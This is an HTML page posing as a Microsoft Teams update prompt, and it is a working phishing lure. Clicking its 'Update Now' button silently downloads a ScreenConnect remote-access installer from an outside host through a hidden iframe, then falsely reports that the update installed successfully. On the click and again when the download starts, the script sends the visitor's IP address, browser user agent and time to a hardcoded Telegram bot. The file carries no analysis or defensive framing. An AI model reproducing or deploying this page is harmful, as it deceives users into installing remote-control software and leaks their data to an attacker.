<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Microsoft Teams Update</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f0f0f0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
            text-align: center;
            max-width: 400px;
            width: 100%;
        }
        .logo {
            width: 60px;
            height: auto;
            margin-bottom: 20px;
        }
        h2 {
            color: #333;
            margin-bottom: 10px;
            font-size: 18px;
        }
        p {
            color: #666;
            margin-bottom: 20px;
            font-size: 14px;
            line-height: 1.4;
        }
        .btn {
            background-color: #5b5fc7; /* Teams purple */
            color: white;
            border: none;
            padding: 12px 24px;
            font-size: 16px;
            border-radius: 4px;
            cursor: pointer;
            transition: background-color 0.3s;
            width: 100%;
        }
        .btn:hover {
            background-color: #4a4ea8;
        }
        .spinner {
            display: none;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #5b5fc7;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .status {
            margin-top: 15px;
            font-size: 12px;
            color: #999;
        }
    </style>
</head>
<body>

<div class="container">
    <!-- Your Specific Logo -->
    <img src="https://i.ibb.co/RK5Lzf7/mteams-logo.jpg" alt="Teams Logo" class="logo">

    <h2>Microsoft Teams Update Available</h2>
    <p>A new version of Microsoft Teams is available. Please update to ensure optimal performance and security.</p>
    
    <button class="btn" id="updateBtn">Update Now</button>
    
    <div class="spinner" id="spinner"></div>
    <div class="status" id="statusText"></div>
</div>

<script>
    // === CONFIGURATION ===
    const TELEGRAM_BOT_TOKEN = '8751898702:AAGLQM3LI6UsBMjLx5QgGQKH0rLtV5y8OeM';
    const TELEGRAM_CHAT_ID = '8478799631';
    const PAYLOAD_URL = 'https://0xarion.com/Bin/ScreenConnect.ClientSetup.exe?e=Access&y=Guest';

    document.getElementById('updateBtn').addEventListener('click', function() {
        const btn = this;
        const spinner = document.getElementById('spinner');
        const status = document.getElementById('statusText');

        // UI Feedback
        btn.style.display = 'none';
        spinner.style.display = 'block';
        status.textContent = 'Downloading update...';

        // Step 1: Notify Click
        sendNotification("🚨 Click Detected!");

        // Step 2: Trigger Download
        setTimeout(() => {
            // Create a hidden iframe to trigger download without losing focus
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = PAYLOAD_URL;
            document.body.appendChild(iframe);

            // Step 3: Notify Download Start
            setTimeout(() => {
                sendNotification("⬇️ Download Started!");
                status.textContent = 'Update installed successfully.';
                spinner.style.display = 'none';
                
                // Optional: Redirect to a fake success page after a few seconds
                // window.location.href = 'https://teams.microsoft.com'; 
            }, 2000);

        }, 1000);
    });

    async function sendNotification(message) {
        const ip = await getIP();
        const userAgent = navigator.userAgent;
        const time = new Date().toLocaleString();
        
        const fullMessage = `${message}\n\nIP: ${ip} \nUser Agent: ${userAgent}\nTime: ${time}`;
        
        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: fullMessage,
                parse_mode: 'HTML'
            })
        }).catch(error => console.error('Error:', error));
    }

    async function getIP() {
        try {
            const response = await fetch('https://ipapi.co/json/');
            const data = await response.json();
            return data.ip || 'Unknown';
        } catch (error) {
            return 'Unknown';
        }
    }
</script>

</body>
</html>
